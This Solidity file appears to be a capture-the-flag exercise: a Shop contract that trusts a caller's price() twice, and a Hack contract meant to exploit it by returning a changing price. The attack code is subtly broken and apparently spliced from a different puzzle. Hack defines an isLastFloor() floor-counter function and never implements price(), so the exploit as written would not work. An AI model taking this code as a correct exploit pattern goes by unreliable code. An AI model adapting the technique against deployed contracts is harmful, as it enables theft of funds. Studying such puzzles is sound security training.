// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint);
}

contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract Hack {
    Shop public shop;
    Buyer public buyer;
    uint private floorCounter;

    constructor(address _shopAddress) {
        buyer = Buyer(address(this));
        shop = Shop(_shopAddress);
    }

    function isLastFloor(uint _floor) external returns (bool) {
        _floor = floorCounter;
        floorCounter++;
        return _floor == 0 ? false : true;
    }

    function attack() external {
        shop.buy();
    }
}
